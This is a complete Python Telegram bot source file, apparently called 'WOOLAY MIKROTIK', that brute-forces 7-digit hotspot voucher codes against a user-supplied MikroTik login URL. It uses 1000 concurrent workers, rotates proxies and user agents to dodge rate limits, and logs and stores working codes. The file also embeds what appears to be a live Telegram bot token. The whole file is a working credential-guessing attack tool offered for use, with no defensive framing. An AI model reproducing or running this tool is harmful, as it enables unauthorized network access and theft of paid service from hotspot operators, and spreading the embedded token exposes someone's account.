#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  WOOLAY MIKROTIK — Best Version
  1000W · Async · Ban-Proof · Railway Fix · Keep-Alive
  
  requirements.txt:
    aiohttp
    aiohttp-socks
    python-telegram-bot==20.7
    flask
"""

import os
import sys
import json
import time
import random
import string
import asyncio
import datetime
import warnings
import signal
from urllib.parse import urlparse
from typing import Optional, Tuple, List, Dict, Any

warnings.filterwarnings("ignore")

import aiohttp

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters,
)

from flask import Flask, Response
from threading import Thread

# ==============================================================================
#  KEEP ALIVE — Railway PORT
# ==============================================================================

_web_app = Flask(__name__)

@_web_app.route('/')
def _home():
    return "⚡ WOOLAY is alive!", 200

@_web_app.route('/health')
def _health():
    return Response("OK", status=200)

def _run_web():
    port = int(os.environ.get("PORT", 8080))
    _web_app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = Thread(target=_run_web, daemon=True)
    t.start()

# ==============================================================================
#  OUTPUT
# ==============================================================================

try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass

def log(*a, **k):
    k.setdefault("flush", True)
    print(*a, **k)

R  = "\x1b[0m"
RED   = "\x1b[1;31m"
GRN   = "\x1b[1;32m"
YLW   = "\x1b[33m"
CYN   = "\x1b[1;36m"

# ==============================================================================
#  CONFIG
# ==============================================================================

BOT_TOKEN   = os.environ.get("BOT_TOKEN", "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o")
ADMIN_IDS   = [8806693453]
OWNER       = "@Woolay"
OWNER_LINK  = "https://t.me/Woolay"

HIT_FILE    = "hits.txt"
PROXY_FILE  = "proxies.txt"
STATE_FILE  = "state.json"
TRIED_TPL   = "tried_{}.txt"

# ── Worker ──
WORKERS           = 1000
MAX_PER_SESSION   = 200
COOLDOWN          = 0.002
REST_BETWEEN_SESS = 2
REQ_TIMEOUT       = 15
CONN_LIMIT        = 500
CONN_PER_HOST     = 100
DNS_TTL           = 300

# ── Code ──
CODE_LEN   = 7
CODE_TOTAL = 10 ** CODE_LEN

# ── Flush ──
STATE_FLUSH = 20
CODE_FLUSH  = 15

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
]

# ==============================================================================
#  GLOBAL
# ==============================================================================

_pm         = None
scanners    = {}
pending     = {}

# ==============================================================================
#  BANNER
# ==============================================================================

def banner():
    l = "═" * 55
    log(RED + l)
    log("   ⚡  WOOLAY MIKROTIK • 1000W  ⚡")
    log(f"        Telegram {OWNER}       ")
    log(l + R)

# ==============================================================================
#  STATE
# ==============================================================================

def _load_states():
    try:
        if not os.path.exists(STATE_FILE): return {}
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except: return {}

def _save_states(d):
    try:
        t = STATE_FILE + ".tmp"
        with open(t, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(t, STATE_FILE)
    except: pass

def get_state(uid):  return _load_states().get(str(uid))
def clr_state(uid):
    a = _load_states(); a.pop(str(uid), None); _save_states(a)

def save_state(uid, st):
    try:
        hits = []
        for h in st.get("hit_details", []):
            t = h.get("time")
            at = t.strftime("%Y-%m-%d %H:%M:%S") if isinstance(t, datetime.datetime) else str(t)
            hits.append({"code": h.get("code", "?"), "at": at})
        _save_states({**_load_states(), str(uid): {
            "url": st.get("login_url", ""),
            "mode": st.get("mode", "num7"),
            "counter": st.get("counter", 0),
            "tried": st.get("tried", 0),
            "hits": st.get("hits", 0),
            "limits": st.get("limits", 0),
            "net": st.get("net", 0),
            "failed": st.get("failed", 0),
            "last_hit": st.get("last_hit"),
            "started_at": st.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            "hit_details": hits,
        }})
    except: pass

# ==============================================================================
#  TRIED
# ==============================================================================

def _tf(uid): return TRIED_TPL.format(uid)

def load_tried(uid):
    f = _tf(uid)
    if not os.path.exists(f): return set()
    try:
        with open(f, "r", errors="ignore") as fp:
            return set(l.strip() for l in fp if l.strip())
    except: return set()

def flush_tried(uid):
    c = pending.get(uid)
    if not c: return 0
    try:
        with open(_tf(uid), "a", encoding="utf-8") as f:
            for x in c: f.write(f"{x}\n")
        n = len(c); pending[uid] = set(); return n
    except: return 0

def clr_tried(uid):
    pending.pop(uid, None)
    try:
        f = _tf(uid)
        if os.path.exists(f): os.remove(f)
    except: pass

def add_tried(uid, code):
    if uid not in pending: pending[uid] = set()
    pending[uid].add(code)

# ==============================================================================
#  HIT FILE
# ==============================================================================

def write_hit(code):
    try:
        with open(HIT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {code}\n")
    except: pass

# ==============================================================================
#  FLUSH LOOPS
# ==============================================================================

async def _code_flusher():
    while True:
        try:
            await asyncio.sleep(CODE_FLUSH)
            for u in list(pending): flush_tried(u)
        except asyncio.CancelledError:
            for u in list(pending): flush_tried(u)
            raise
        except: pass

async def _state_flusher():
    while True:
        try:
            await asyncio.sleep(STATE_FLUSH)
            for u, s in list(scanners.items()):
                if s.get("running"): save_state(u, s)
        except asyncio.CancelledError:
            for u, s in list(scanners.items()):
                if s.get("running"): save_state(u, s)
            raise
        except: pass

# ==============================================================================
#  PROXY
# ==============================================================================

class ProxyMgr:
    def __init__(self, fp):
        self.fp = fp
        self.proxies = []
        self.bad = set()
        self.lock = asyncio.Lock()
        self.idx = 0
        self.load()

    @staticmethod
    def _norm(p):
        p = (p or "").strip()
        if not p or p.startswith("#"): return None
        if not p.startswith(("http://","https://","socks4://","socks5://")):
            p = "socks5://" + p
        return p

    @staticmethod
    def _valid(p):
        try:
            r = p.split("://",1)[1] if "://" in p else p
            if "@" in r: r = r.split("@",1)[1]
            h, pt = r.rsplit(":",1)
            return bool(h and pt) and 1 <= int(pt) <= 65535
        except: return False

    def load(self):
        try:
            if not os.path.exists(self.fp):
                open(self.fp,"w").close()
                self.proxies = []; return
            with open(self.fp) as f: raw = f.read().splitlines()
            seen, v = set(), []
            for l in raw:
                p = self._norm(l)
                if p and self._valid(p) and p not in seen:
                    seen.add(p); v.append(p)
            self.proxies = v
            random.shuffle(self.proxies)
            log(GRN + f"[Proxy] {len(self.proxies)} loaded" + R if self.proxies else YLW + "[Proxy] DIRECT" + R)
        except Exception as e:
            log(RED + f"[Proxy] {e}" + R)

    def _write(self):
        try:
            with open(self.fp,"w") as f: f.write("\n".join(self.proxies))
        except: pass

    def add(self, lines):
        a = b = 0
        for l in lines:
            l = l.strip()
            if not l or l.startswith("#"): continue
            p = self._norm(l)
            if not p or not self._valid(p) or p in self.proxies: b += 1; continue
            self.proxies.append(p); a += 1
        if a: random.shuffle(self.proxies); self._write()
        return a, b

    async def next(self):
        async with self.lock:
            if not self.proxies: return None
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1; return p

    async def bad_mark(self, p):
        if not p: return
        async with self.lock: self.bad.add(p)

    @property
    def count(self): return len(self.proxies)

def PM():
    global _pm
    if _pm is None: _pm = ProxyMgr(PROXY_FILE)
    return _pm

# ==============================================================================
#  CHECKER — BAN-PROOF
# ==============================================================================

async def check(session, code, url, proxy):
    try:
        p = urlparse(url)
        origin = f"{p.scheme}://{p.netloc}"
    except: origin = url

    dst = f"http://192.168.{random.randint(0,255)}.{random.randint(1,254)}/"
    ua  = random.choice(USER_AGENTS)

    hdr = {
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":  "en-US,en;q=0.9",
        "Cache-Control":    "max-age=0",
        "Connection":       "keep-alive",
        "Content-Type":     "application/x-www-form-urlencoded",
        "Origin":           origin,
        "Referer":          url,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent":       ua,
    }

    data = {"dst": dst, "popup": "true", "username": code, "password": ""}

    for attempt in range(5):
        try:
            async with session.post(
                url, data=data, headers=hdr,
                timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                ssl=False, allow_redirects=True,
            ) as r:
                body = await r.text()
            lo = body.lower()

            # ✅ HIT
            if "you are logged in" in lo:
                return "hit", body
            if "invalid username or password" not in lo \
               and "already authorizing" not in lo \
               and len(body) > 100 \
               and "login" not in lo \
               and "error" not in lo:
                return "hit", body

            # ❌ BAD
            if "invalid username or password" in lo:
                return "bad", body

            # ⚠️ LIMIT
            if "already authorizing" in lo or "retry later" in lo or "request limited" in lo or "too many" in lo:
                if attempt < 4:
                    await asyncio.sleep(0.5 * (attempt + 1))
                    continue
                return "limit", body

            return "bad", body

        except asyncio.TimeoutError:
            return "net", None
        except aiohttp.ClientConnectorError as e:
            log(RED + f"[ConnErr] {e}" + R)
            return "net", None
        except aiohttp.ClientError:
            return "net", None
        except OSError:
            return "net", None
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log(RED + f"[CheckErr] {e}" + R)
            return "net", None

    return "failed", None

# ==============================================================================
#  CODE GEN
# ==============================================================================

def seq_code(c):  return str(c).zfill(CODE_LEN)
def rand_code():  return str(random.randint(0, CODE_TOTAL - 1)).zfill(CODE_LEN)

# ==============================================================================
#  WORKER
# ==============================================================================

async def _worker(wid, uid):
    pm = PM()
    st = scanners.get(uid)
    if not st: return

    stop   = st["stop"]
    tried  = st["tried"]
    url    = st["login_url"]
    mode   = st.get("mode", "num7")

    while not stop.is_set():
        proxy = await pm.next()

        # ── Connector: တစ်ခါတစ်ရ ဖန်တီး (Railway safe) ──
        conn = None
        try:
            if not proxy:
                conn = aiohttp.TCPConnector(
                    limit=CONN_LIMIT, limit_per_host=CONN_PER_HOST,
                    ttl_dns_cache=DNS_TTL, ssl=False,
                    enable_cleanup_closed=True, force_close=True,
                )
            elif HAS_SOCKS and proxy.startswith(("socks4://","socks5://")):
                conn = ProxyConnector.from_url(
                    proxy, rdns=True,
                    limit=CONN_LIMIT, limit_per_host=CONN_PER_HOST,
                    ttl_dns_cache=DNS_TTL, enable_cleanup_closed=True,
                )
            elif HAS_SOCKS:
                conn = ProxyConnector.from_url(
                    proxy,
                    limit=CONN_LIMIT, limit_per_host=CONN_PER_HOST,
                    ttl_dns_cache=DNS_TTL, enable_cleanup_closed=True,
                )
        except: conn = None

        sess = None
        try:
            sess = aiohttp.ClientSession(
                connector=conn, connector_owner=True,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                headers={"User-Agent": random.choice(USER_AGENTS)},
            )

            cnt = 0
            fails = 0

            while not stop.is_set() and cnt < MAX_PER_SESSION:
                # ── code ──
                if mode == "num7":
                    st["counter"] += 1
                    if st["counter"] >= CODE_TOTAL: break
                    code = seq_code(st["counter"])
                else:
                    code = rand_code()

                if code in tried: continue

                tried.add(code)
                add_tried(uid, code)
                st["cur"] = code

                # ── check ──
                res, body = await check(sess, code, url, proxy)
                cnt += 1
                st["tried"] += 1

                if res == "hit":
                    st["hits"]     += 1
                    st["hit_list"].append(code)
                    st["last_hit"]  = code
                    st["logs"].append(f"🔥 {code}")
                    st["hit_details"].append({"code": code, "time": datetime.datetime.now()})
                    write_hit(code)
                    flush_tried(uid)
                    save_state(uid, st)

                elif res == "limit":
                    st["limits"] += 1
                    st["logs"].append("⚠️ LIMIT")
                    break

                elif res == "net":
                    st["net"] += 1
                    fails += 1
                    if fails >= 3:
                        await pm.bad_mark(proxy)
                        break
                    break

                elif res == "failed":
                    st["failed"] += 1
                    break

                else:
                    st["failed"] += 1

                if stop.is_set(): break
                await asyncio.sleep(COOLDOWN)

        except asyncio.CancelledError: raise
        except: st["net"] += 1
        finally:
            if sess:
                try: await sess.close()
                except: pass

        if stop.is_set(): break
        await asyncio.sleep(REST_BETWEEN_SESS)

# ==============================================================================
#  DASHBOARD
# ==============================================================================

def _hits_text(details, total, mx=30):
    lines = [f"  ▸ <code>{h.get('code','?')}</code>" for h in details]
    if not lines: return "🎁 <b>HITS • 0</b>\n┌─────────────┐\n  💀 None\n└─────────────┘"
    if len(lines) > mx:
        lines = [f"  … +{len(lines)-mx} more"] + lines[-mx:]
    return f"🎁 <b>HITS • {total}</b>\n┌─────────────┐\n" + "\n".join(lines) + "\n└─────────────┘"

async def _dash(ctx, uid):
    st = scanners.get(uid)
    if not st: return
    stop = st["stop"]
    mid  = st.get("dash_id")
    pm   = PM()
    try:
        while not stop.is_set():
            await asyncio.sleep(5)
            if stop.is_set(): break
            el   = max(time.time() - st["t0"], 1)
            spm  = int(st["tried"] / el * 60)
            act  = pm.count
            ll   = (st["logs"][-1:] or ["idle"])[-1]
            px   = f"🕷️ {act}" if act else "⚡ DIRECT"

            txt = (
                "╔═════════════════════════╗\n"
                "║  ⚡ <b>WOOLAY MIKROTIK</b> ⚡  ║\n"
                "║     7 DIGIT SCANNER     ║\n"
                "╚═════════════════════════╝\n\n"
                "📊 <b>STATS</b>\n"
                f"├ 👁️ Tested  <code>{st['tried']:,}</code>\n"
                f"├ 🩸 Hits    <code>{st['hits']}</code>\n"
                f"├ ⚠️ Limits  <code>{st['limits']}</code>\n"
                f"└ ❌ Errors  <code>{st['net']}</code>\n\n"
                "⚡ <b>SPEED</b>\n"
                f"├ 🚀 <code>{spm:,} c/m</code>\n"
                f"├ 👥 Workers <code>{WORKERS}</code>\n"
                f"└ 🕷️ <code>{px}</code>\n\n"
                "🎯 <b>NOW</b>\n"
                f"├ 🔮 <code>{st.get('cur') or '—'}</code>\n"
                f"├ 🗡️ <code>{st.get('last_hit') or '—'}</code>\n"
                f"└ 📜 <code>{ll}</code>\n\n"
                f"{_hits_text(st.get('hit_details',[]), st['hits'])}\n\n"
                f"╭─ ⚡ WOOLAY · {OWNER} ─╮"
            )
            try:
                await ctx.bot.edit_message_text(
                    uid, mid, txt,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")]]))
            except: pass
    except asyncio.CancelledError: raise

async def _dash_final(ctx, uid, st):
    pm  = PM()
    el  = max(time.time() - st["t0"], 1)
    spm = int(st["tried"] / el * 60)
    px  = f"🕷️ {pm.count}" if pm.count else "⚡ DIRECT"

    txt = (
        "╔═════════════════════════╗\n"
        "║   💀 <b>SCAN ENDED</b> 💀    ║\n"
        "║      ⚡ <b>WOOLAY</b> ⚡      ║\n"
        "╚═════════════════════════╝\n\n"
        "📊 <b>FINAL</b>\n"
        f"├ 👁️ Tested  <code>{st['tried']:,}</code>\n"
        f"├ 🩸 Hits    <code>{st['hits']}</code>\n"
        f"├ ⚠️ Limits  <code>{st['limits']}</code>\n"
        f"├ ❌ Errors  <code>{st['net']}</code>\n"
        f"├ 🚀 Speed   <code>{spm:,} c/m</code>\n"
        f"└ 🕷️ <code>{px}</code>\n\n"
        f"{_hits_text(st.get('hit_details',[]), st['hits'], 90)}\n\n"
        "💾 <i>Saved — START to resume</i>\n\n"
        f"╭─ ⚡ WOOLAY · {OWNER} ─╮"
    )
    try:
        await ctx.bot.edit_message_text(
            uid, st["dash_id"], txt,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]]))
    except: pass

# ==============================================================================
#  RUN
# ==============================================================================

async def run_scan(ctx, uid):
    if scanners.get(uid, {}).get("running"): return

    pm  = PM()
    url = ctx.user_data.get("login_url", "")
    if not url:
        await ctx.bot.send_message(uid, "❌ Login URL မထည့်ရသေး\n🔮 LOGIN URL နှိပ်ပါ", parse_mode=ParseMode.HTML)
        return

    sv = get_state(uid)
    resume = bool(sv and sv.get("url") == url)
    if sv and not resume:
        clr_state(uid); clr_tried(uid); sv = None

    if resume and sv:
        tried_set = load_tried(uid)
        hd = []
        for h in sv.get("hit_details", []):
            try:    t = datetime.datetime.strptime(h.get("at",""), "%Y-%m-%d %H:%M:%S")
            except: t = datetime.datetime.now()
            hd.append({"code": h.get("code","?"), "time": t})
        mode    = sv.get("mode","num7")
        counter = sv.get("counter", 0)
        tried   = sv.get("tried", 0)
        hits    = sv.get("hits", 0)
        limits  = sv.get("limits", 0)
        net     = sv.get("net", 0)
        failed  = sv.get("failed", 0)
        last    = sv.get("last_hit")
        sat     = sv.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    else:
        tried_set = set(); hd = []
        mode    = ctx.user_data.get("mode", "num7")
        counter = tried = limits = net = failed = hits = 0
        last = None
        sat = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    st = {
        "running": True, "login_url": url, "mode": mode,
        "counter": counter, "stop": asyncio.Event(),
        "tried": tried, "hits": hits, "limits": limits, "net": net, "failed": failed,
        "hit_list": [h["code"] for h in hd], "tried": tried, "tried_codes": tried_set,
        "logs": [], "last_hit": last, "cur": None,
        "t0": time.time(), "hit_details": hd, "started_at_str": sat,
    }
    scanners[uid] = st

    msg = await ctx.bot.send_message(uid, "🔁 RESUMING" if resume else "⚡ Starting...", parse_mode=ParseMode.HTML)
    st["dash_id"] = msg.message_id
    save_state(uid, st)

    tasks = [asyncio.create_task(_worker(i, uid)) for i in range(WORKERS)]
    tasks.append(asyncio.create_task(_dash(ctx, uid)))
    st["tasks"] = tasks

    try:
        await st["stop"].wait()
    finally:
        for t in tasks:
            if not t.done(): t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        flush_tried(uid); save_state(uid, st)
        try: await _dash_final(ctx, uid, st)
        except: pass
        st["running"] = False

# ==============================================================================
#  MENU
# ==============================================================================

MODES = {"num7": "🩸 07 Sequential", "rand7": "🎲 07 Random"}

def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔮 LOGIN URL", callback_data="btn_url"),
         InlineKeyboardButton("📜 MODES", callback_data="btn_mode")],
        [InlineKeyboardButton("⚡ START", callback_data="btn_start"),
         InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")],
        [InlineKeyboardButton("👁️ STATUS", callback_data="btn_status"),
         InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clr")],
        [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_proxy")],
        [InlineKeyboardButton("⚡ WOOLAY ⚡", url=OWNER_LINK)],
    ])

def mode_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🩸 07 Sequential", callback_data="m_num7"),
         InlineKeyboardButton("🎲 07 Random", callback_data="m_rand7")],
        [InlineKeyboardButton("🦇 BACK", callback_data="btn_back")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]])

def menu_txt(mode, act, url, uid):
    px = f"🕷️ Proxies: <code>{act}</code>" if act else "⚡ Direct"
    ul = "🔮 URL: ✅" if url else "❌ URL: Not set"
    rv = ""
    sv = get_state(uid)
    if sv and sv.get("url") == (url or ""):
        rv = (f"\n💾 <b>Saved</b>\n"
              f"├ Tried: <code>{sv.get('tried',0):,}</code>\n"
              f"├ Hits:  <code>{sv.get('hits',0)}</code>\n"
              f"└ Mode:  <code>{MODES.get(sv.get('mode','num7'),'')}</code>\n")
    return (f"╔═════════════════════════╗\n"
            "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
            "║  MIKROTIK × 7 DIGIT   ║\n"
            "╚═════════════════════════╝\n\n"
            f"📜 Mode: <code>{MODES.get(mode,mode)}</code>\n"
            f"{px}\n"
            f"⚡ Workers: <code>{WORKERS}</code>\n"
            f"{ul}\n{rv}")

# ==============================================================================
#  HANDLERS
# ==============================================================================

async def cmd_start(up, ctx):
    uid = up.effective_user.id
    pm  = PM()
    txt = menu_txt(ctx.user_data.get("mode","num7"), pm.count, ctx.user_data.get("login_url",""), uid)
    await up.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())

async def on_btn(up, ctx):
    q = up.callback_query; await q.answer()
    uid = q.from_user.id; d = q.data

    if d == "btn_back":
        txt = menu_txt(ctx.user_data.get("mode","num7"), PM().count, ctx.user_data.get("login_url",""), uid)
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())

    elif d == "btn_url":
        ctx.user_data["wait_url"] = True
        await q.edit_message_text(
            "🔮 <b>Send MikroTik Login URL</b>\n\nExample:\n<code>http://hotspot.example.com/login</code>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

    elif d == "btn_mode":
        await q.edit_message_text("📜 <b>Select Mode</b>", parse_mode=ParseMode.HTML, reply_markup=mode_kb())

    elif d.startswith("m_"):
        m = d[2:]
        ctx.user_data["mode"] = m
        txt = menu_txt(m, PM().count, ctx.user_data.get("login_url",""), uid)
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())

    elif d == "btn_start":
        if scanners.get(uid, {}).get("running"):
            await q.answer("⚠️ Running!", show_alert=True); return
        if not ctx.user_data.get("login_url"):
            await q.answer("❌ Set URL first!", show_alert=True); return
        await q.edit_message_text("⚡ <b>Starting...</b>", parse_mode=ParseMode.HTML)
        asyncio.create_task(run_scan(ctx, uid))

    elif d == "stop_scan":
        st = scanners.get(uid)
        if st and st.get("running"):
            st["stop"].set(); await q.answer("🛑 Stopping...")
        else: await q.answer("Not running", show_alert=True)

    elif d == "btn_status":
        pm = PM()
        await q.edit_message_text(f"🕷️ <b>Proxy</b>\n\nActive: <code>{pm.count}</code>\nBad: <code>{len(pm.bad)}</code>",
                                   parse_mode=ParseMode.HTML, reply_markup=back_kb())

    elif d == "btn_clr":
        pm = PM(); pm.proxies = []; pm.bad = set(); pm._write()
        await q.edit_message_text("🧹 <b>Cleared</b>", parse_mode=ParseMode.HTML, reply_markup=back_kb())

    elif d == "btn_proxy":
        ctx.user_data["wait_px"] = True
        await q.edit_message_text(
            "🕷️ <b>Send proxies</b> (one/line)\n\n<code>host:port</code>\n<code>host:port:user:pass</code>\n<code>socks5://host:port</code>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

async def on_msg(up, ctx):
    uid = up.effective_user.id; txt = up.message.text

    if ctx.user_data.get("wait_url"):
        ctx.user_data["wait_url"] = False
        ctx.user_data["login_url"] = txt.strip()
        m = ctx.user_data.get("mode","num7")
        menu = menu_txt(m, PM().count, txt.strip(), uid)
        await up.message.reply_text("✅ <b>URL Saved!</b>", parse_mode=ParseMode.HTML)
        await up.message.reply_text(menu, parse_mode=ParseMode.HTML, reply_markup=main_kb())

    elif ctx.user_data.get("wait_px"):
        ctx.user_data["wait_px"] = False
        pm = PM()
        a, b = pm.add(txt.strip().splitlines())
        await up.message.reply_text(
            f"🕷️ <b>Proxies</b>\n✅ Valid: <code>{a}</code>\n❌ Invalid: <code>{b}</code>\n📦 Total: <code>{pm.count}</code>",
            parse_mode=ParseMode.HTML)

# ==============================================================================
#  MAIN
# ==============================================================================

async def _post_init(app):
    banner()
    log(GRN + "[Bot] Ready" + R)

def main():
    keep_alive()

    app = Application.builder().token(BOT_TOKEN).post_init(_post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_btn))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_msg))

    log(GRN + "[Bot] Starting WOOLAY..." + R)
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
